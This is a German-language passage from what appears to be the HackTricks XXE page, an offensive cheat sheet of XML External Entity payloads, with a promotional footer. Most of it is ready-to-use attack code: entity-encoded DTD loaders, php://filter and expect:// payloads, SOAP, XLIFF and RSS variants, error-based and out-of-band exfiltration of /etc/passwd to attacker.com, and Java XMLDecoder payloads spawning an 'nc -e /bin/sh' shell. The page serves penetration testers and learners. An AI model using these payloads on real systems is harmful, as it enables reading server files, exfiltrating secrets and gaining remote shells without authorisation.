Wenn die Website Java verwendet, k√∂nnen Sie das [**jar: Protokoll**](xxe-xee-xml-external-entity.md#jar-protocol) √ºberpr√ºfen.

### HTML-Entit√§ten

Trick von [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Sie k√∂nnen eine **Entit√§t innerhalb einer Entit√§t** erstellen, indem Sie sie mit **HTML-Entit√§ten** codieren und sie dann aufrufen, um eine **DTD zu laden**.\
Beachten Sie, dass die verwendeten **HTML-Entit√§ten** **numerisch** sein m√ºssen (wie im \[diesem Beispiel]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD-Beispiel:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP-Wrapper

### Base64

**Extrahieren** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Externe Ressource extrahieren**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote code execution

**Wenn das PHP-Modul "expect" geladen ist**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Dieses Beispiel ist inspiriert von [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) wird verwendet, um den Datenaustausch in Lokalisierungsprozessen zu standardisieren. Es handelt sich um ein auf XML basierendes Format, das haupts√§chlich zur √úbertragung lokalisierbarer Daten zwischen Tools w√§hrend der Lokalisierung und als gemeinsames Austauschformat f√ºr CAT (Computer-Aided Translation) Tools verwendet wird.

### Analyse der Blindanfrage

Eine Anfrage wird an den Server mit dem folgenden Inhalt gesendet:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Jedoch l√∂st diese Anfrage einen internen Serverfehler aus, der speziell ein Problem mit den Markup-Deklarationen erw√§hnt:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Trotz des Fehlers wird ein Treffer im Burp Collaborator verzeichnet, was auf eine gewisse Interaktion mit der externen Entit√§t hinweist.

Out of Band Datenexfiltration Um Daten zu exfiltrieren, wird eine modifizierte Anfrage gesendet:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Diese Methode zeigt, dass der User Agent die Verwendung von Java 1.8 angibt. Eine bekannte Einschr√§nkung dieser Java-Version besteht darin, dass es nicht m√∂glich ist, Dateien mit einem Zeilenumbruchzeichen wie z. B. /etc/passwd mithilfe der Out-of-Band-Technik abzurufen.

Datenexfiltration basierend auf Fehlern Um diese Einschr√§nkung zu √ºberwinden, wird ein fehlerbasierter Ansatz verwendet. Die DTD-Datei ist wie folgt strukturiert, um einen Fehler auszul√∂sen, der Daten aus einer Zieldatei enth√§lt:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Der Server antwortet mit einem Fehler, der deutlich auf die nicht vorhandene Datei hinweist, was darauf hindeutet, dass der Server versucht, auf die angegebene Datei zuzugreifen:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Um den Inhalt der Datei in der Fehlermeldung einzuschlie√üen, wird die DTD-Datei angepasst:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Diese Modifikation f√ºhrt zur erfolgreichen Exfiltration des Dateiinhalts, wie es im Fehlerausgabewert, der √ºber HTTP gesendet wird, reflektiert wird. Dies deutet auf einen erfolgreichen XXE (XML External Entity) Angriff hin, der sowohl Out-of-Band- als auch Fehlerbasierte Techniken nutzt, um sensible Informationen zu extrahieren.

## RSS - XEE

G√ºltiges XML im RSS-Format zur Ausnutzung einer XXE-Schwachstelle.

### Ping zur√ºck

Einfacher HTTP-Request an den Server des Angreifers
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Datei lesen

XML External Entity (XXE) Injection erm√∂glicht es einem Angreifer, Dateien auf dem Server zu lesen. Der Angreifer kann sensible Informationen wie Passw√∂rter, Konfigurationsdateien und andere vertrauliche Daten abrufen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Quellcode lesen

Verwendung des PHP Base64-Filters
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE zu RCE

XMLDecoder ist eine Java-Klasse, die Objekte basierend auf einer XML-Nachricht erstellt. Wenn ein b√∂sartiger Benutzer eine Anwendung dazu bringen kann, beliebige Daten in einem Aufruf der Methode **readObject** zu verwenden, wird er sofort Codeausf√ºhrung auf dem Server erlangen.

### Verwendung von Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

Der `ProcessBuilder` in Java wird verwendet, um ein neues Unterprozessobjekt zu erstellen, das verwendet werden kann, um externe Prozesse zu starten.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Werkzeuge

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referenzen

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Extrahieren von Informationen √ºber HTTP mithilfe eigener externer DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)


<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
